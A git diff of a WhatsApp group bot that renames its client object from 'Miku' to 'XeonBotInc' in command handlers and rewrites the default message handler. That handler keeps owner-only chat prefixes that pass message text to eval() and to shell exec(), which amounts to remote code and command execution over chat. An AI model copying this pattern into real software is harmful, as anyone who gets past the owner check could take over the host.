 if (!isCreator) return replay(`${mess.botowner}`)
-await Miku.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await XeonBotInc.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                 }
                 break
 
@@ -5034,7 +4661,7 @@ id: '-owner'
 }
 }]
 let txt = `「 *${global.OwnerName}'s Broadcast* 」\n\n${text}`
-Miku.send5ButImg(yoi, txt, `${global.BotName}`, BotLogo, btn, Thumb)
+XeonBotInc.send5ButImg(yoi, txt, `${global.BotName}`, BotLogo, btn, Thumb)
 }
 replay('Broadcast Sent !')
 }
@@ -5054,7 +4681,7 @@ const key = {
     participant: m.quoted.sender
 }
 
-await Miku.sendMessage(m.chat, { delete: key })
+await XeonBotInc.sendMessage(m.chat, { delete: key })
  }
  break
  
@@ -5063,7 +4690,7 @@ case 'masukin': case 'code500': case 'tambahin':{
  if (!isBotAdmins) return replay(mess.botadmin)
  let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
  if (users.length == 0) return replay(`Tolong ketik nomor orang yang ingin ditambahkan`)
-  await Miku.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => replay(`Orang tersebut telah ditambahkan!`)).catch((err) => replay(`Gabisa nambahin orang tersebut ke group ini!`))
+  await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => replay(`Orang tersebut telah ditambahkan!`)).catch((err) => replay(`Gabisa nambahin orang tersebut ke group ini!`))
  }
  break
 
@@ -5081,7 +4708,7 @@ case 'masukin': case 'code500': case 'tambahin':{
         : m.text;
       const SpeakEngine = require("google-tts-api"); 
       const texttospeechurl = SpeakEngine.getAudioUrl(texttosay, {lang: "en", slow: false, host: "https://translate.google.com",});
-      Miku.sendMessage(m.chat,{audio: {url: texttospeechurl,},mimetype: "audio/mpeg",fileName: `MikuSpeechEngine.mp3`,},{quoted: m,});
+      XeonBotInc.sendMessage(m.chat,{audio: {url: texttospeechurl,},mimetype: "audio/mpeg",fileName: `XeonBotIncSpeechEngine.mp3`,},{quoted: m,});
     }
     break;
 
@@ -5120,7 +4747,7 @@ footer: `ᴍɪᴜɴᴀ`,
 buttons: buttonsclogm,
 headerType: 4
 }
-Miku.sendMessage(m.chat, buttonMessage,{ quoted:m })
+XeonBotInc.sendMessage(m.chat, buttonMessage,{ quoted:m })
 }
 break	
 	
@@ -5354,9 +4981,9 @@ let asukau = {
     footer : 'ᴍɪᴜɴᴀ',
     headerType : 4,
     }
-Miku.sendMessage(m.sender, buttonMessage)
+XeonBotInc.sendMessage(m.sender, buttonMessage)
 await sleep(1000)
-Miku.sendMessage(m.chat , asukau, {quoted : m})
+XeonBotInc.sendMessage(m.chat , asukau, {quoted : m})
 }
 	break
 
@@ -5424,7 +5051,7 @@ Miku.sendMessage(m.chat , asukau, {quoted : m})
                     headerType: 4
                     
                 }
-            Miku.sendMessage(m.chat, buttonMessage,{ quoted:m })
+            XeonBotInc.sendMessage(m.chat, buttonMessage,{ quoted:m })
                 }
 	break
 	
@@ -5489,7 +5116,7 @@ let sections = []
      sections.push(list)   
      }
      }
-  const sendm =  Miku.sendMessage(
+  const sendm =  XeonBotInc.sendMessage(
       from, 
       {
        text: `OtakuDesu!`,
@@ -5523,7 +5150,7 @@ let sections = []
      }
      sections.push(list)   
      }
-  const sendm =  Miku.sendMessage(
+  const sendm =  XeonBotInc.sendMessage(
       from, 
       {
        text: `Neonime Latest`,
@@ -5547,7 +5174,7 @@ image : {url : thumb},
 caption : `${teks}`,
 headerType : 1
 }
-Miku.sendMessage(from, buttonMessage,{quoted : m})
+XeonBotInc.sendMessage(from, buttonMessage,{quoted : m})
 }
 break
 case 'dongnasi': case 'donasi': case 'donate':{
@@ -5562,96 +5189,105 @@ text : teks,
 footer : 'ᴍɪᴜɴᴀ sʜɪᴏᴅᴏᴍᴇ',
 headerType: 4
 }
-Miku.sendMessage(m.chat, dongnasi,{quoted :m}) 
+XeonBotInc.sendMessage(m.chat, dongnasi,{quoted :m}) 
  }
- break		
+ break	     
+        default:
+                if (budy.startsWith('=>')) {
+                    if (!isCreator) return reply(mess.owner)
+                    function Return(sul) {
+                        sat = JSON.stringify(sul, null, 2)
+                        bang = util.format(sat)
+                            if (sat == undefined) {
+                                bang = util.format(sul)
+                            }
+                            reply(bang)
+                    }
+                    try {
+                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
+                    } catch (e) {
+                        reply(String(e))
+                    }
+                }
 
+                if (budy.startsWith('>')) {
+                    if (!isCreator) return reply(mess.owner)
+                    try {
+                        let evaled = await eval(budy.slice(2))
+                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+                        await reply(evaled)
+                    } catch (err) {
+                        await reply(String(err))
+                    }
+                }
 
-default:
-
-   /* if(isCmd){
-        if (isBan) return reply(mess.banned)	 			
-        if (isBanChat) return reply(mess.bangc)
-        reply (`Tidak ada perintah seperti itu *${pushname}* senpai! Ketik *${prefix}help* untuk melihat semua perintah!`)
-
-    }	
-    
-if (budy.startsWith(`miuna`)) {
-if (!isCreator) return reply (ning)
-reply (jawab)
+                if (budy.startsWith('$')) {
+                    if (!isCreator) return reply(mess.owner)
+                    exec(budy.slice(2), (err, stdout) => {
+                        if(err) return reply(err)
+                        if (stdout) return reply(stdout)
+                    })
+                }
+			
+		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
+                    this.anonymous = this.anonymous ? this.anonymous : {}
+                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
+                    if (room) {
+                        if (/^.*(next|leave|start)/.test(m.text)) return
+                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
+                        let other = [room.a, room.b].find(user => user !== m.sender)
+                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
+                            contextInfo: {
+                                ...m.msg.contextInfo,
+                                forwardingScore: 0,
+                                isForwarded: true,
+                                participant: other
+                            }
+                        } : {})
+                    }
+                    return !0
+                }
+/*			//anti-tag
+const listTag = [`${global.ownertag}@s.whatsapp.net`]
+const partiNum = (m.mtype === 'extendedTextMessage') ? m.message.extendedTextMessage.contextInfo.participant : ''
+//anti-tag 2
+if (listTag.includes(partiNum)) {
+if (antitags === false) return
+if (!m.isGroup) return
+if (m.key.fromMe) return
+sendNye = fs.readFileSync('./XeonMedia/theme/yourtag.webp')
+XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id])
+XeonBotInc.sendMessage(from, {sticker:sendNye, contextInfo:{forwardingScore: 800, isForwarded: true}}, {quoted:m})
 }
-
-if (budy.startsWith(`Miuna`)) {
-if (!isCreator) return reply (ning)  
-    reply (jawab)
-}
-if (budy.startsWith(`sayang`)) {
-if (!isCreator) return reply ('😒')
-    reply (jawab)
-}
-		
-if (budy.startsWith(`I love you miuna`)) {
-if (!isCreator) return reply (`Ah gomen\naku lebih menyukai Ri oniichan >_<`)
-    reply (`I love you to Ri oniichan`)
+//anti-tag 3
+if (budy.includes(`${global.ownertag}`)) {
+if (antitags === false) return
+if (!m.isGroup) return
+if (m.key.fromMe) return
+sendNye = fs.readFileSync('./XeonMedia/theme/yourtag.webp')
+XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id])
+XeonBotInc.sendMessage(from, {sticker:sendNye, contextInfo:{forwardingScore: 800, isForwarded: true}}, {quoted:m})
 }*/
+		if (isCmd && budy.toLowerCase() != undefined) {
+		    if (m.chat.endsWith('broadcast')) return
+		    if (m.isBaileys) return
+		    let msgs = global.db.data.database
+		    if (!(budy.toLowerCase() in msgs)) return
+		    XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
+		}
+        }
+        
 
-if (budy.startsWith('=>')) {
-if (!isCreator) return reply(mess.botowner)
-function Return(sul) {
-sat = JSON.stringify(sul, null, 2)
-bang = util.format(sat)
-if (sat == undefined) {
-bang = util.format(sul)
-}
-return reply(bang)
-}
-try {
-reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
-} catch (e) {
-Miku.sendMessage(from, {image:ErrorPic, caption:String(e)}, {quoted:m})
-}
-}
-if (budy.startsWith('>')) {
-if (!isCreator) return reply(mess.botowner)
-try {
-let evaled = await eval(budy.slice(2))
-if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
-await reply(evaled)
-} catch (err) {
-await Miku.sendMessage(from, {image:ErrorPic, caption:String(err)}, {quoted:m})
-}
-}
-
-
-                
-if (budy.startsWith('$')) {
-if (!isCreator) return replay(mess.botowner)
-exec(budy.slice(2), (err, stdout) => {
-if(err) return Miku.sendMessage(from, {image:ErrorPic, caption:String(err)}, {quoted:m})
-if (stdout) return replay(stdout)
-})
-}
-
-
-if (isCmd && budy.toLowerCase() != undefined) {
-if (m.chat.endsWith('broadcast')) return
-if (m.isBaileys) return
-let msgs = global.db.database
-if (!(budy.toLowerCase() in msgs)) return
-Miku.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
-}
-}
-}catch (err) {
-Miku.sendMessage(`${ownertag}@s.whatsapp.net`, util.format(err), {quoted:m})
-console.log(err)
-}
+    } catch (err) {
+        m.reply(util.format(err))
+    }
 }
 
 
 let file = require.resolve(__filename)
 fs.watchFile(file, () => {
-fs.unwatchFile(file)
-console.log(chalk.redBright(`Update ${__filename}`))
-delete require.cache[file]
-require(file)
+	fs.unwatchFile(file)
+	console.log(chalk.redBright(`Update ${__filename}`))
+	delete require.cache[file]
+	require(file)
 })
